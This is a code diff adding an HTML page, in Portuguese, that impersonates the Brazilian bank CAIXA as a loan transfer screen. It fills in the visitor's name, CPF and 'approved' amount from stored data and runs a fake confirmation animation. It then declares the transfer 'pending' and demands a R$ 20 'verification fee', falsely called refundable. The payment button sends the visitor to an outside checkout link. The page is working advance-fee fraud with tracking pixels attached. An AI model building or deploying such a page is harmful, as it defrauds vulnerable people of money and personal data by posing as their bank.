@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Transferência CAIXA</title>
+
+<script>
+  localStorage.setItem("upsell", "up3");
+</script>
+
+<script src="js/latest_1.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script src="https://cdn.tailwindcss.com"></script>
+
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        caixaBlue2:'#015CA9',
+        caixaLightBlue2:'#049FD6',
+        caixaBlue:'#1A65C0',
+        caixaLightBlue:'#2386D9',
+        caixaOrange:'#F39209',
+      }
+    }
+  }
+}
+
+const LOADING_DURATION = 3;
+const PAYMENT_LOADING_DURATION = 2;
+</script>
+</head>
+
+<body class="bg-white">
+
+<script>
+    window.pixelId = "692cedccf1d8644d9b7bb3bc";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  
+
+<!-- HEADER -->
+<div class="bg-gradient-to-r from-caixaBlue2 to-caixaLightBlue2 text-white px-4 py-3">
+  <div class="flex items-center">
+    <div class="size-10 mr-3">
+      <img src="/upsell2/images/caixaiconeb.png" class="w-full">
+    </div>
+    <div class="flex-1">
+      <h1 class="text-sm font-medium">Transferência do Empréstimo Caixa</h1>
+      <p class="text-sm opacity-90" id="currentDateTime">--</p>
+    </div>
+  </div>
+</div>
+
+<!-- CONTEÚDO -->
+<div class="px-4 py-6">
+
+  <div class="mb-6">
+    <h2 class="text-lg font-bold text-caixaLightBlue mb-2">Resumo da transferência</h2>
+    <p class="text-zinc-600 text-sm">Por favor, verifique as informações.</p>
+  </div>
+
+  <!-- DADOS DO SAQUE -->
+  <div class="mb-6">
+    <h3 class="text-caixaLightBlue font-semibold text-sm mb-3">Dados do saque</h3>
+
+    <div class="flex justify-between py-1">
+      <span class="text-zinc-500 font-bold text-sm">Valor</span>
+      <span id="valorSaque" class="text-zinc-600 text-sm">R$ --</span>
+    </div>
+
+    <div class="flex justify-between py-1">
+      <span class="text-zinc-500 font-bold text-sm">Data do pagamento</span>
+      <span id="paymentDate" class="text-zinc-600 text-sm">--</span>
+    </div>
+  </div>
+
+  <!-- DESTINATÁRIO -->
+  <div class="mb-6">
+    <h3 class="text-caixaLightBlue font-semibold text-sm mb-3">Quem vai receber</h3>
+
+    <div class="flex justify-between py-1">
+      <span class="text-zinc-500 font-bold text-sm">Nome</span>
+      <span id="recipientName" class="text-zinc-800 text-sm">--</span>
+    </div>
+
+    <div class="flex justify-between py-1">
+      <span class="text-zinc-500 font-bold text-sm">CPF</span>
+      <span id="recipientCPF" class="text-zinc-800 text-sm">--</span>
+    </div>
+  </div>
+
+  <p class="text-zinc-600 text-sm mb-6">
+    Clique no botão abaixo para seu saque ser liberado na sua chave pix cadastrada.
+  </p>
+
+  <button onclick="handleConfirmation()" class="w-full bg-caixaOrange text-white font-bold py-3 rounded-lg">
+    CONFIRMAR
+  </button>
+
+  <div id="loadingState" class="hidden mt-6">
+    <div class="w-full bg-zinc-200 rounded-full h-2">
+      <div id="progressBar" class="bg-caixaOrange h-2 rounded-full" style="width:0%"></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ESTADO PENDENTE -->
+<div id="pendingState" class="hidden px-4 py-6">
+  <div class="text-center">
+    <img src="/upsell2/images/cadeado-icon.png" class="w-16 h-16 mx-auto mb-4">
+
+    <h2 class="text-xl font-bold text-caixaLightBlue mb-3">Transferência Pendente!</h2>
+
+    <p class="text-zinc-700 text-sm mb-4">
+      <strong>Sr.(a) <span id="pendingName">--</span></strong>, a movimentação do valor de
+      <strong id="pendingValue">R$ --</strong> é incomum de acordo com seus registros.
+    </p>
+
+    <p class="text-zinc-700 text-sm mb-4">
+      Para sua segurança, é necessário o pagamento da
+      <strong>Taxa de Verificação</strong> no valor de <strong>R$ 20,00</strong>.
+    </p>
+
+    <button onclick="handlePayment()" class="w-full bg-[#30BF63] text-white font-bold py-3 rounded-lg mb-4">
+      EFETUAR O PAGAMENTO DA TAXA
+    </button>
+
+    <p class="text-xs font-bold text-zinc-900">
+      Essa taxa é reembolsável após a confirmação do pagamento.
+    </p>
+  </div>
+</div>
+
+<!-- LOADING FULL -->
+<div id="fullscreenLoading" class="hidden fixed inset-0 bg-white z-50 flex items-center justify-center">
+  <div class="text-center">
+    <div class="w-12 h-12 border-4 border-caixaOrange border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+    <p>Carregando...</p>
+  </div>
+</div>
+
+<script>
+function onlyDigits(v){return(v||"").replace(/\D/g,"")}
+function formatCPF(c){c=onlyDigits(c);return c.length===11?c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"):"--"}
+function formatBR(n){
+  n=Number(n);
+  if(!isFinite(n))return null;
+  let f=n.toFixed(2).split(".");
+  return f[0].replace(/\B(?=(\d{3})+(?!\d))/g,".")+","+f[1];
+}
+
+function updateDate(){
+  const d=new Date();
+  const day=String(d.getDate()).padStart(2,"0");
+  const m=String(d.getMonth()+1).padStart(2,"0");
+  const y=d.getFullYear();
+  const h=String(d.getHours()).padStart(2,"0");
+  const min=String(d.getMinutes()).padStart(2,"0");
+  document.getElementById("currentDateTime").textContent=`${day}/${m}/${y} - ${h}:${min}`;
+  document.getElementById("paymentDate").textContent=`${day}/${m}/${y}`;
+}
+
+document.addEventListener("DOMContentLoaded",()=>{
+  updateDate();
+
+  let nome=null,cpf=null;
+
+  try{
+    const du=JSON.parse(localStorage.getItem("dadosUsuario")||"{}");
+    nome=du.nome||localStorage.getItem("nomeUsuario");
+    cpf=du.cpf;
+  }catch(e){}
+
+  if(nome){
+    document.getElementById("recipientName").textContent=nome;
+    document.getElementById("pendingName").textContent=nome.split(" ")[0];
+  }
+
+  if(cpf){
+    document.getElementById("recipientCPF").textContent=formatCPF(cpf);
+  }
+
+  let valor=localStorage.getItem("creditoAprovado") ||
+            formatBR(localStorage.getItem("creditoAprovadoValor"));
+
+  if(valor){
+    document.getElementById("valorSaque").textContent="R$ "+valor;
+    document.getElementById("pendingValue").textContent="R$ "+valor;
+  }
+});
+
+function handleConfirmation(){
+  document.querySelector("button").style.display="none";
+  document.getElementById("loadingState").classList.remove("hidden");
+
+  const bar=document.getElementById("progressBar");
+  bar.style.transition=`width ${LOADING_DURATION}s`;
+  setTimeout(()=>bar.style.width="100%",100);
+
+  setTimeout(()=>{
+    document.querySelector(".px-4.py-6").style.display="none";
+    document.getElementById("fullscreenLoading").classList.remove("hidden");
+
+    setTimeout(()=>{
+      document.getElementById("fullscreenLoading").classList.add("hidden");
+      document.getElementById("pendingState").classList.remove("hidden");
+    },PAYMENT_LOADING_DURATION*1000);
+
+  },LOADING_DURATION*1000);
+}
+
+function handlePayment(){
+  const params=new URLSearchParams(window.location.search);
+  window.location.href="https://www.pay-pagamentos.link/checkout/70ff04f1-7f0b-4fcd-a146-a5dd399d1a1b?"+params.toString();
+}
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+</body>
+</html>
